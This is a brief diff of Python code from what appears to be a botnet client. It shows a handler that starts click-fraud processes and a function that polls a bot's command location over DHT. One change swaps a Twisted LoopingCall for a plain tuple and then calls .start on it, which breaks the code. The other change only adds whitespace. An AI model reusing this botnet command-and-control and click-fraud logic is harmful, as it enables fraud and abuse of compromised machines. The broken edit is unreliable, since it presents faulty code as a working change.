@@ -94,7 +94,7 @@ def get_cmd(value, server, bot):
                 print("Starting CLICKFRAUD on {0}".format(tmp))
                 process = subprocess.Popen(tmp.split(), shell=False)
 
-    except Exception, e:
+    except Exception,  e:
         pass
 
 # This function checks the bots unique command location for a command by using DHT
@@ -117,7 +117,7 @@ def ack_valid(value, server, bot):
         print("no ack")
     else:
         print("we have an ack")
-        cmdloop = task.LoopingCall(wait_cmd, server, bot)
+        cmdloop = (wait_cmd, server, bot)
         cmdloop.start(5)
         # wait_cmd(None,server,bot)
 
